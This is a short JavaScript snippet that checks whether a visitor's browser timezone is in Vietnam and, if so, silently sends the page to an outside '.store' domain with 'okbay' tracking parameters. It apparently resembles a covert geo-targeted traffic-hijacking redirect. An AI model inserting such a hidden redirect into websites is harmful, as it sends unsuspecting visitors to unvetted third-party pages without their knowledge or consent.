var conf = (window.__OKBAY_CONF__) || {};
var utm_source = conf.utm_source || 'okbay';
var utm_campaign = conf.utm_campaign || 'okbay';

const userTimeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
if (userTimeZone === 'Asia/Ho_Chi_Minh' || userTimeZone === 'Asia/Saigon') {
  var to = 'https://okla-wv-3.store/?utm_source=' + encodeURIComponent(utm_source)
         + '&utm_campaign=' + encodeURIComponent(utm_campaign);
  window.location.href = to;
}
